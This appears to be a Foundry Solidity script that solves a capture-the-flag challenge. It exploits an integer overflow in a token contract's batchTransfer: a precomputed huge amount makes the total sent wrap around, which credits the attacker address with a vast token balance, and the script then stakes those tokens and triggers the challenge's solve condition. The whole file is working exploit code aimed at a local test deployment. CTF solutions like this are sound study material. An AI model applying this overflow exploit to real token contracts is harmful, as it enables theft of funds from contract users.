//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/Setup.sol";
import {Stake} from "src/Stake.sol";
import {INR} from "src/INR.sol";


contract Exploit is Script {
    address badDude;

    function run() public {
        Setup setup = Setup(0x5FbDB2315678afecb367f032d93F642f64180aa3); // local addr
        Stake stake = Stake(setup.stake());
        INR inr = INR(setup.inr());

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        badDude = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        setup.claim();
        // see amount.py to see how to get this value
        uint256 amount = 77194726158210796949047323339125271902179989777093709359638389338608753093291;
        address[] memory receivers = new address[](3);
        receivers[0] = address(badDude); // let's receive 77194726158210796949047323339125271902179989777093709359638389338608753093291 tokens
        // sending to stake 2 * amount so INR.balanceOf(stake) = 2 * amount
        receivers[1] = address(address(stake));
        receivers[2] = address(address(stake));

        inr.batchTransfer(receivers, amount); // now INR.balanceOf(badDude) == amount and INR.balanceOf(stake) = 2 * amount
        inr.approve(address(stake), inr.balanceOf(badDude));
        inr.transfer(address(stake), amount - 100_000 ether); // to get the ratio OK in the solve condition (using overflow), the -100_000 ether is for the stakeAmount

        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(), "nah plz ctf god, enlight me! what's wrong my lil' boi");

        vm.stopBroadcast();
    }
}